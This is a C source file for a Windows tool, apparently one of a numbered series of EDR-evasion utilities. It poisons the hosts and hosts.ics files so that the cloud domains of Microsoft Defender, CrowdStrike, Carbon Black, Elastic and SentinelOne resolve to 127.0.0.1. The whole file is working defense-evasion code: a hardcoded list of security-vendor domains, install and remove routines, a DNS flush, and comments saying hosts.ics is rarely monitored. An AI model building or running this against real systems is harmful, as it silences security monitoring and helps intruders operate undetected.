/*
 * 17_hosts_poison.c
 * Hosts File Poisoning — redirect EDR cloud domains to 127.0.0.1
 *
 * The Windows DNS resolution order is:
 *   1. In-process cache
 *   2. DNS client cache
 *   3. hosts file (C:\Windows\System32\drivers\etc\hosts)  ← we inject here
 *   4. hosts.ics (Internet Connection Sharing host file)   ← also inject here
 *   5. DNS server
 *
 * Advantages: no WFP, no registry changes visible in common tools.
 * Limitation: no wildcard support — each subdomain must be listed explicitly.
 *
 * Also injects into hosts.ics which is rarely monitored by EDRs.
 *
 * Build:
 *   cl 17_hosts_poison.c
 *
 * Usage:
 *   17_hosts_poison.exe install              Inject all EDR domains
 *   17_hosts_poison.exe install <dom1> ...   Inject specific domains
 *   17_hosts_poison.exe remove               Remove injected entries
 *   17_hosts_poison.exe show                 Print current hosts file
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

/* Marker string embedded in every injected line for cleanup */
#define MARKER "## __edr_block__"

/* Loopback address to redirect to */
#define SINKHOLE_IP "127.0.0.1"

/* EDR cloud domains */
static const char *EDR_DOMAINS[] = {
    /* Microsoft Defender for Endpoint */
    "endpoint.security.microsoft.com",
    "us.vortex-win.data.microsoft.com",
    "v20.vortex-win.data.microsoft.com",
    "settings-win.data.microsoft.com",
    "events.data.microsoft.com",
    "winatp-gw-cus.microsoft.com",
    "winatp-gw-eus.microsoft.com",
    "winatp-gw-weu.microsoft.com",
    "winatp-gw-neu.microsoft.com",
    "ioatp-gw.microsoft.com",
    /* Azure (used by MDE artifact upload) */
    "storageaccountnamehere.blob.core.windows.net",
    /* CrowdStrike */
    "ts01-b.cloudsink.net",
    "lfodown01-b.cloudsink.net",
    "ts01-gyr.cloudsink.net",
    "lfodown01-gyr.cloudsink.net",
    /* Carbon Black */
    "datacollector.carbonblack.io",
    /* Elastic */
    "fleet.elastic.co",
    "apm.elastic.co",
    /* SentinelOne */
    "mgmt.sentinelone.net",
    NULL
};

static const WCHAR *HOSTS_FILE = L"C:\\Windows\\System32\\drivers\\etc\\hosts";
static const WCHAR *HOSTS_ICS  = L"C:\\Windows\\System32\\drivers\\etc\\hosts.ics";

/* Append a single entry line to a file */
static BOOL AppendEntry(const WCHAR *filePath, const char *domain)
{
    FILE *f = NULL;
    errno_t err = _wfopen_s(&f, filePath, L"a");
    if (err != 0 || !f) return FALSE;

    fprintf(f, "%s %s  %s\n", SINKHOLE_IP, domain, MARKER);
    fclose(f);
    return TRUE;
}

/* Install entries for a list of domains into both hosts and hosts.ics */
static void InstallEntries(const char **domains)
{
    for (int i = 0; domains[i] != NULL; i++) {
        AppendEntry(HOSTS_FILE, domains[i]);
        AppendEntry(HOSTS_ICS,  domains[i]);
        wprintf(L"  [+] %S\n", domains[i]);
    }
}

/* Remove all lines containing the marker from a file */
static DWORD RemoveMarkedLines(const WCHAR *filePath)
{
    /* Read entire file into memory */
    FILE *fin = NULL;
    if (_wfopen_s(&fin, filePath, L"r") != 0 || !fin) return 0;

    /* Get file size */
    fseek(fin, 0, SEEK_END);
    long fileSize = ftell(fin);
    fseek(fin, 0, SEEK_SET);

    if (fileSize <= 0) { fclose(fin); return 0; }

    char *content = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)fileSize + 1);
    if (!content) { fclose(fin); return 0; }

    size_t readLen = fread(content, 1, (size_t)fileSize, fin);
    content[readLen] = '\0';
    fclose(fin);

    /* Write back without marked lines */
    FILE *fout = NULL;
    if (_wfopen_s(&fout, filePath, L"w") != 0 || !fout) {
        HeapFree(GetProcessHeap(), 0, content);
        return 0;
    }

    DWORD removed = 0;
    char *line = content;
    char *next;

    while (line && *line) {
        /* Find end of line */
        next = strchr(line, '\n');
        if (next) *next = '\0';

        if (strstr(line, MARKER)) {
            removed++;
        } else {
            fprintf(fout, "%s\n", line);
        }

        line = next ? (next + 1) : NULL;
    }

    fclose(fout);
    HeapFree(GetProcessHeap(), 0, content);
    return removed;
}

/* Print current hosts file content */
static void ShowHostsFile(void)
{
    wprintf(L"=== %s ===\n", HOSTS_FILE);
    FILE *f = NULL;
    if (_wfopen_s(&f, HOSTS_FILE, L"r") == 0 && f) {
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            wprintf(L"%S", line);
        }
        fclose(f);
    }

    wprintf(L"\n=== %s ===\n", HOSTS_ICS);
    if (_wfopen_s(&f, HOSTS_ICS, L"r") == 0 && f) {
        char line[1024];
        while (fgets(line, sizeof(line), f)) {
            wprintf(L"%S", line);
        }
        fclose(f);
    } else {
        wprintf(L"(file does not exist yet)\n");
    }
}

/* Flush DNS cache via ipconfig */
static void FlushDns(void)
{
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    WCHAR cmd[] = L"cmd.exe /c ipconfig /flushdns";
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        wprintf(L"[+] DNS cache flushed.\n");
    }
}

int main(int argc, char *argv[])
{
    wprintf(L"[*] Hosts File Poison Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %S install             Inject all built-in EDR domains\n", argv[0]);
        wprintf(L"  %S install <d1> [d2]  Inject specific domains\n", argv[0]);
        wprintf(L"  %S remove             Remove all injected entries\n", argv[0]);
        wprintf(L"  %S show               Show current hosts file\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "show") == 0) {
        ShowHostsFile();
        return 0;
    }

    if (strcmp(argv[1], "remove") == 0) {
        DWORD n1 = RemoveMarkedLines(HOSTS_FILE);
        DWORD n2 = RemoveMarkedLines(HOSTS_ICS);
        wprintf(L"[+] Removed %lu entries from hosts, %lu from hosts.ics\n", n1, n2);
        FlushDns();
        return 0;
    }

    if (strcmp(argv[1], "install") == 0) {
        if (argc >= 3) {
            /* Specific domains from command line */
            wprintf(L"[*] Injecting %d domain(s)...\n", argc - 2);
            const char **domains = (const char **)(argv + 2);
            InstallEntries(domains);
        } else {
            /* Built-in list */
            int count = 0;
            while (EDR_DOMAINS[count] != NULL) count++;
            wprintf(L"[*] Injecting %d built-in EDR domain(s)...\n", count);
            InstallEntries(EDR_DOMAINS);
        }

        FlushDns();

        wprintf(L"\n[+] Injection complete.\n");
        wprintf(L"[*] hosts: %s\n", HOSTS_FILE);
        wprintf(L"[*] hosts.ics: %s (rarely monitored by EDRs)\n", HOSTS_ICS);
        wprintf(L"[!] Limitation: No wildcard support — subdomains not covered.\n");
        wprintf(L"[!] Use 05_nrpt_sinkhole.exe for wildcard coverage.\n");
        return 0;
    }

    wprintf(L"[-] Unknown command: %S\n", argv[1]);
    return 1;
}
